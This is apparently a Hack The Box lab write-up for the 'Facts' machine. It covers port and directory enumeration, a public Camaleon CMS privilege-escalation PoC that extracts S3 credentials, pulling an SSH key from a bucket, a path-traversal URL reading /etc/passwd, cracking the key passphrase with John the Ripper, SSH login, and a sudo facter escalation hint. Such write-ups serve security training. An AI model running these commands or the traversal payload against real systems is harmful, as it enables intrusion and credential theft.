# factsHTB
Writeup of the seasonal Facts Hack the Box machine


Initial nmap scan of the machine reveals 2 PoA being a HTTP site and SSH service being hosted.

```
┌──(root㉿kali-linux-2024-2)-[/]
└─# nmap -sV -sC 10.129.4.222
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 22:56 -0600
Nmap scan report for 10.129.4.222
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```

Going to the website we find a trivia website -- nothing special however further enumeration with DirBuster shows us a hidden directory:

```
Starting dir/file list based brute forcing
Dir found: /admin/forgot/ - 200
Dir found: / - 200
Dir found: /admin/ - 302
File found: /admin/login - 200
Dir found: /randomfacts/ - 403
File found: /admin/forgot - 200
Dir found: /.bash_history/ - 200
Dir found: /.bashrc/ - 200
File found: /welcome - 200
```

None of these are significant besides one: `/admin/login`. Going to that webpage we see a login with a sign up page.

Creating an account lets us analyze the behind the scenes of the website. Though we have an account there is no real access but -- scanning the page we see the backend is running `Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0`

Inputing `Camaleon v2.9.0 CVE` on google brings up [`CVE-2025-2304`](https://github.com/advisories/GHSA-rp28-mvq3-wf8j). Analysis of this CVE tells us that there is a severe vulnerability with the permit! function within the source code. Improper input validation allows for privilege escalation. Read more at the link above.

We can look up the CVE with the attatched keywords of 'github' or 'POC' and find [`Alien0ne CVE-2025-2304`](https://github.com/Alien0ne/CVE-2025-2304) proof of concept. We can then clone the repository and execute using the required parameters.

**NOTE All though not necessary -- its imparative that if you want to remain admin -- vim into the `exploit.py` file and comment out the user role revert function to log back in after running the exploit.**

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# python3 exploit.py -u http://facts.htb -U tesst -P tesst123 -e
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 7
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 7
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: ACCESS_KEY_HERE
   s3 secret key: SECRET_ACCESS_KEY_HERE
   s3 endpoint: http://localhost:54321
```

s3 credentials help us futher enumerate the s3 buckets for more hidden information. Configuring aws using the new credentials and connecting with the endpoint we can see the hidden buckets.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
└─# aws --endpoint-url http://facts.htb:54321 s3 ls                    
2025-09-11 21:06:52 internal
2025-09-11 21:06:52 randomfacts

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
└─# aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
2026-04-16 15:47:07         82 authorized_keys
2026-04-16 15:47:07        464 id_ed25519
```

The s3 bucket `internal` contains an ssh key named `id_ed25519`. We can download the key to be used for a shell connection to the server. 

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519  
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519             

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
└─#cat id_ed25519            
-----BEGIN OPENSSH PRIVATE KEY-----
OPENSSH_KEY_HERE
-----END OPENSSH PRIVATE KEY-----
```

Now that we can establish a ssh connection to the server there is still the missing piece of which user the key belongs to. 

A quick search of Camaleon CMS v2.9.0 leads us to [`CVE-2024-46987`](https://nvd.nist.gov/vuln/detail/CVE-2024-46987). Research on this CVE tells us there is path traversal vulnerability accessible via MediaController's download_private_file method -- allowing authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions). This issue may lead to Information Disclosure.

Following a link rabbit hole takes us to [`owen2345 camaleon-cms Github`](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c). Giving us a PoC exploit to use.

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
└─# cat passwd                       
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

2 users stand out in this passwd file -- `trivia` and `william`. `_laurel` likely relates to a logging software used to track movements within the system. If this were a real scenario be mindful of that is pertinent. 

We try to login via ssh but we need the passphrase or password to login. The passphrase can be obtained through decrypting the hash of the OPENSSH key.

We could try both users but it's better practice to first meet some prerequisites. Firstly need to hash the openssh key and crack via john the ripper.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# ssh2john ./id_ed25519 > hash.txt
                                                                
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After cracking the passphrase we can then attempt login via ssh using the key.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# ssh -i ./id_ed25519 trivia@facts.htb
Enter passphrase for key './id_ed25519': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Apr 16 02:20:14 PM UTC 2026

  System load:           0.13
  Usage of /:            72.1% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             222
  Users logged in:       1
  IPv4 address for eth0: 10.129.244.96
  IPv6 address for eth0: dead:beef::250:56ff:feb0:2150


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ 
```

Success. We can now enumerate the further to find the `user.txt` flag.

```
trivia@facts:~$ ls
trivia@facts:~$ pwd
/home/trivia
trivia@facts:~$ cd ..
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home$ cd william
trivia@facts:/home/william$ ls
user.txt
trivia@facts:/home/william$ cat user.txt
USER_FLAG_HERE
trivia@facts:/home/william$ 
```

With the user flag in hand we can now try standard Linux post-exploitation enumeration.

```
trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`sudo -l` shows us that user `trivia` can run facter via root. Facter is a lightweight, cross-platform command-line tool used in Linux (and other OSs) to collect and display system information, known as "facts," such as hardware, network settings, and operating system versions.

Facter's `--custom-dir ` is notoriously abusable to allow for privilege escalation -- which can be used within the server.